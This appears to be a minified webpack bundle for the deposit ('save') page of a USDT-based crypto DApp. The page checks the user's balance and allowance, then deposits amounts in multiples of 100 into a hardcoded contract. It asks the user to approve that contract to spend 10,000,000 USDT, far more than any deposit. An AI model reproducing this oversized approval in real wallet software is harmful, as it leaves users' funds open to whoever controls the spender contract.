(window["webpackJsonp"]=window["webpackJsonp"]||[]).push([["pages-save-save"],{"0ea8":function(t,e,n){"use strict";n.r(e);var a=n("8eb4"),i=n.n(a);for(var s in a)["default"].indexOf(s)<0&&function(t){n.d(e,t,(function(){return a[t]}))}(s);e["default"]=i.a},"252a":function(t,e,n){"use strict";n.r(e);var a=n("312b"),i=n("0ea8");for(var s in i)["default"].indexOf(s)<0&&function(t){n.d(e,t,(function(){return i[t]}))}(s);n("b99b");var r=n("f0c5"),u=Object(r["a"])(i["default"],a["b"],a["c"],!1,null,"aa158dd6",null,!1,a["a"],void 0);e["default"]=u.exports},"312b":function(t,e,n){"use strict";n.d(e,"b",(function(){return a})),n.d(e,"c",(function(){return i})),n.d(e,"a",(function(){}));var a=function(){var t=this,e=t.$createElement,a=t._self._c||e;return a("v-uni-view",{staticClass:"content"},[a("Menu"),a("v-uni-view",{staticClass:"banner"},[a("v-uni-image",{attrs:{src:n("527b")}})],1),a("v-uni-view",{staticClass:"save"},[a("v-uni-view",{staticClass:"form"},[a("v-uni-view",{staticClass:"title"},[t._v(t._s(t.$t("save.title")))]),a("v-uni-view",{staticClass:"tab"},[a("v-uni-view",{staticClass:"in"},[a("v-uni-view",{staticClass:"unit"},[a("v-uni-view",{staticClass:"token"},[a("v-uni-image",{attrs:{src:n("691a")}}),a("v-uni-view",{staticClass:"token"},[t._v("USDT")])],1),a("v-uni-view",{staticClass:"asset"},[t._v(t._s(t.$t("index.balance"))+"ï¼š"+t._s(t._f("countsFilter")(t.usdtTotal)))])],1),a("v-uni-input",{staticClass:"inp",attrs:{type:"number",placeholder:this.$t("save.tips")},model:{value:t.usdt,callback:function(e){t.usdt=e},expression:"usdt"}})],1),a("v-uni-view",{staticClass:"tip"},[t._v(t._s(t.$t("save.tip")))]),a("v-uni-view",{staticClass:"oper"},[0==t.grantNumber&&0==t.auth?a("v-uni-button",{staticClass:"btn",on:{click:function(e){arguments[0]=e=t.$handleEvent(e),t.grantUsdt.apply(void 0,arguments)}}},[t._v(t._s(t.$t("other.auth")))]):t._e(),0==t.grantNumber&&1==t.auth?a("v-uni-button",{staticClass:"btn"},[t._v(t._s(t.$t("other.authing")))]):t._e(),t.grantNumber>0&&0==t.save?a("v-uni-button",{staticClass:"btn",on:{click:function(e){arguments[0]=e=t.$handleEvent(e),t.beforSave.apply(void 0,arguments)}}},[t._v(t._s(t.$t("save.title")))]):t._e(),t.grantNumber>0&&1==t.save?a("v-uni-button",{staticClass:"btn",on:{click:function(e){arguments[0]=e=t.$handleEvent(e),t.beforSave.apply(void 0,arguments)}}},[t._v(t._s(t.$t("other.save")))]):t._e()],1),a("v-uni-view",{staticClass:"infos"},[a("v-uni-view",{staticClass:"l1"},[t._v(t._s(t.$t("save.t1")))]),a("v-uni-view",{staticClass:"items"},[a("v-uni-view",{staticClass:"item"},[t._v(t._s(t.$t("save.t2")))]),a("v-uni-view",{staticClass:"item"},[t._v(t._s(t.$t("save.t3")))]),a("v-uni-view",{staticClass:"item"},[t._v(t._s(t.$t("save.t4")))])],1),a("v-uni-view",{staticClass:"info"},[t._v(t._s(t.$t("save.t5")))])],1)],1)],1)],1)],1)},i=[]},"527b":function(t,e,n){t.exports=n.p+"static/img/contact.5b163e7a.jpg"},"691a":function(t,e){t.exports="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgCAMAAADVRocKAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAq1BMVEUAAAAgn4Akp4AkqIAjqIAkqYAkqYAlqYAkqoAkqoAlp4AlqoAgp4AjqYAlqoEop4AmrIEkqYAlqoAmqYEkqYAlqYAkqIAlqIAgr4Alp4AjpoAkqYA/tI///fp3yK7j8utow6bI6NxAtJB2yK6S072t3s2649TW7eOEzrZbvp9NuZcyroe749Sf2MQxrofk8utpw6at3szx+PPk8+tAtI/x+PLj8+uR073///8cdPijAAAAG3RSTlMAEEBwkK/P3++/YJ8gUG8gX48wX++gsJ8QoFCoGir2AAAAAWJLR0Q4oAel1gAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB+UGEQQPHpcmbLsAAAM5SURBVGjexZrtdqMgEIZRNKhpN036le6UTf2KYmLSNd3d+7+z/ZG2SSwiKHP6/jQn8wADA8xAiJYcl3r+hAUAAAELfY+6DrElJ5oykGgyja4sWKchKBSOZLhK60f518Mbz0BLLBpk/0cA2hqAcBkYyRAx88FYUwN33wQwQNqdcOYwUHOtxTdjMFhMY5gWAYwQW/QOP4zUbc/kh9GiyPaVhBuwos5RWoAlLezPz0vdSWerY80+AJOtuDlY1Pyr/Qis6hbPAR1uuAfL8lEHCADAvQBIBuiZG+iXZCb1dWAs4CJkMAzAnaP2wGjAWRcYDuDTC9eAA/icSA9YgPB9EQMWABzVIrMBOLo5xAOEihGC51VL5wbbv71A9xhph6H4DKD7n8gkjg4BPBJCJpgARsgSMAHgEBcX4BKKC6DEwwV4HYHopOQlzfJ1sSou10GxiuM8K0XV8/cH0n0T3ogyL4ptXaZVsgOAfasHiXgt621RrDOx6TQyIR3HlU0ZF3l60b59xxBVr7+LOKu65qn0QiPiJhPtj3uFD57LVZFKz0dE1vqY17uvn/dqJ2f88Cb5LANseSxrTA8Atvyw0wNw/ufNHLDZcy70ABnnh9QUIArO/8qGSObkrOH8ULebsz2F/6Jt/V/MudRxdx1HlnLFOW/i+qXaqBfSJknrdcM5b2ohn6Zd0Vpk76Ghidd1VqZCVEmSJABJkiSVEGma1fnH8l7VYte1aapChSjruFFvxk2Rl13Gj6GiN9jtKpFmdR5foOI4z7P0tdr1Bzv0cI2+4aBvmYRhAiaEkCfsYwv6wWuJCbhSHH5tAI4XBIoHOCY6l3iA93xCiAV4+MhTYwF+Kq+x4wGnZALFAZxy2csAA3CeDaEYgKgnnTMWwC4LHvYBrWqCbxvw2E4KBnYBXysJkV2ApNzi2QR4kszvsm8mlflJQ1LLOm7QvX5ffU9631p6VlFPozbsK4s4FNm+hVHqrTcuRuX5g8X3lxoJWXpD7Xu6LxWiQZ0IDGrWsydz+77Z+wTTTjDXuKpvggjooHcJughGBz9DudbYSUOXjNEsUj89oRbe0MyiJ2k6gE0jiy90XOr54cfzn4nB85//6QsJ/u8dPR4AAAAldEVYdGRhdGU6Y3JlYXRlADIwMjEtMDYtMTdUMDQ6MTQ6MzgrMDA6MDBJi2a/AAAAJXRFWHRkYXRlOm1vZGlmeQAyMDIxLTA2LTE3VDA0OjE0OjM4KzAwOjAwONbeAwAAAABJRU5ErkJggg=="},"8eb4":function(t,e,n){"use strict";n("7a82");var a=n("4ea4").default;Object.defineProperty(e,"__esModule",{value:!0}),e.default=void 0;var i=a(n("c7eb")),s=a(n("1da1"));n("acd8"),n("e25e");var r=a(n("cd87")),u=a(n("4c65")),o=a(n("7a4e")),d={components:{Menu:o.default},data:function(){return{usdtContract:"0x0d43B61aBE6c5aE1F41371a08da5ec26f8d74682",dtmContract:"0xBD63e220611Db4836Cc07daA0a61F171cB489689",usdtTotal:"",grantNumber:"",usdt:"",auth:0,save:0}},filters:{countsFilter:function(t){if("NaN"===t){return"".concat("0.0000")}var e=parseFloat(t).toFixed(4);return"".concat(e)}},onShow:function(){this.getAssets(),this.getGrantNumber()},methods:{getAssets:function(){var t=this;return(0,s.default)((0,i.default)().mark((function e(){var n,a,s,u;return(0,i.default)().wrap((function(e){while(1)switch(e.prev=e.next){case 0:return n=uni.getStorageSync("address"),a=t.$web3,s=new a.eth.Contract(r.default,t.usdtContract),e.next=5,s.methods.balanceOf(n).call();case 5:u=e.sent,t.usdtTotal=$web3.utils.fromWei(String(u),"ether");case 7:case"end":return e.stop()}}),e)})))()},getGrantNumber:function(){var t=this;return(0,s.default)((0,i.default)().mark((function e(){var n,a,s,u;return(0,i.default)().wrap((function(e){while(1)switch(e.prev=e.next){case 0:return n=uni.getStorageSync("address"),a=t.$web3,s=new a.eth.Contract(r.default,t.usdtContract),e.next=5,s.methods.allowance(n,t.dtmContract).call();case 5:u=e.sent,t.grantNumber=u;case 7:case"end":return e.stop()}}),e)})))()},grantUsdt:function(){this.auth=1;var t=uni.getStorageSync("address"),e=this.$web3,n=$web3.utils.toWei(String("10000000"),"ether"),a=new e.eth.Contract(r.default,this.usdtContract),u=this;a.methods.approve(this.dtmContract,BigInt(n)).send({from:t}).on("transactionHash",function(){var t=(0,s.default)((0,i.default)().mark((function t(e){var n;return(0,i.default)().wrap((function(t){while(1)switch(t.prev=t.next){case 0:e&&(n=setInterval((function(){u.getGrantNumber(),u.grantNumber>0&&(u.auth=0,clearInterval(n))}),1e3));case 1:case"end":return t.stop()}}),t)})));return function(e){return t.apply(this,arguments)}}()).catch((function(t){uni.showToast({title:t.message,duration:2e3,icon:"none",success:function(){u.auth=0}})}))},beforSave:function(){this.usdt>=100&&parseInt(this.usdt)%100==0?this.saveUsdt():uni.showToast({title:this.$t("other.tip1"),duration:2e3,icon:"none"})},saveUsdt:function(){var t=this;this.save=1;var e=this.$web3,n=uni.getStorageSync("address"),a=$web3.utils.toWei(String(this.usdt),"ether"),r=new e.eth.Contract(u.default,this.dtmContract),o=this;r.methods.deposit(BigInt(a)).send({from:n}).on("transactionHash",function(){var e=(0,s.default)((0,i.default)().mark((function e(n){return(0,i.default)().wrap((function(e){while(1)switch(e.prev=e.next){case 0:n&&uni.showToast({title:t.$t("other.yes3"),duration:2e3,icon:"success",success:function(){o.save=0,o.getAssets()}});case 1:case"end":return e.stop()}}),e)})));return function(t){return e.apply(this,arguments)}}()).catch((function(t){uni.showToast({title:t.message,duration:2e3,icon:"error",success:function(){o.save=0,o.getAssets()}})}))}}};e.default=d},b99b:function(t,e,n){"use strict";var a=n("eced"),i=n.n(a);i.a},cd87:function(t){t.exports=JSON.parse('[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[],"name":"DOMAIN_SEPARATOR","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"DOMAIN_TYPEHASH","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"PERMIT_TYPEHASH","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"pure","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"pure","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"nonces","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"permit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"pure","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]')},cf91:function(t,e,n){var a=n("24fb");e=a(!1),e.push([t.i,".content[data-v-aa158dd6]{background-color:#1f0644;height:100%;background-size:100%}.banner uni-image[data-v-aa158dd6]{width:100%}.save[data-v-aa158dd6]{padding:0 %?30?%;margin-top:%?-250?%;position:relative;z-index:1}.tab[data-v-aa158dd6]{border:1px solid hsla(0,0%,100%,.105);padding:%?60?% %?30?%;margin:%?70?% 0;border-radius:%?20?%}.form[data-v-aa158dd6]{background-color:#1f0644;padding:%?80?% %?30?%;border-radius:%?30?%}.title[data-v-aa158dd6]{text-align:center;color:#fff;font-size:%?50?%;font-weight:700;letter-spacing:%?2?%}.in[data-v-aa158dd6]{padding:0 %?30?%}.inp[data-v-aa158dd6]{padding:%?30?%;border-radius:%?30?%;color:#fff;opacity:.9;box-shadow:inset 0 0 %?8?% %?4?% #00a2ff}[data-v-aa158dd6] .uni-input-placeholder{color:#6180c0;opacity:.9;font-size:%?28?%}.unit[data-v-aa158dd6]{display:flex;justify-content:space-between;align-items:center;margin-bottom:%?30?%}.token[data-v-aa158dd6]{display:flex;align-items:center}.asset[data-v-aa158dd6]{color:#f0f8ff;opacity:.8}.unit uni-image[data-v-aa158dd6]{width:%?40?%;height:%?40?%}.token[data-v-aa158dd6]{color:#fff;font-size:%?34?%;padding-left:%?10?%}.tip[data-v-aa158dd6]{padding:%?20?% %?30?%;color:#fff;font-size:%?24?%;opacity:.8}.infos[data-v-aa158dd6]{background-color:hsla(0,0%,100%,.06);border-radius:%?20?%;padding:%?30?%;color:#fff;margin-top:%?50?%}.l1[data-v-aa158dd6]{padding:%?20?% 0}.item[data-v-aa158dd6]{line-height:%?44?%}.info[data-v-aa158dd6]{margin-top:%?40?%;font-size:%?24?%}.oper[data-v-aa158dd6]{margin-top:%?40?%}.btn[data-v-aa158dd6]{width:40%;box-shadow:inset 0 0 %?20?% %?10?% #00a2ff;background:unset;border-radius:%?40?%;color:#fff;padding:%?10?% 0;font-size:%?30?%}",""]),t.exports=e},eced:function(t,e,n){var a=n("cf91");a.__esModule&&(a=a.default),"string"===typeof a&&(a=[[t.i,a,""]]),a.locals&&(t.exports=a.locals);var i=n("4f06").default;i("7e84ff22",a,!0,{sourceMap:!1,shadowMode:!1})}}]);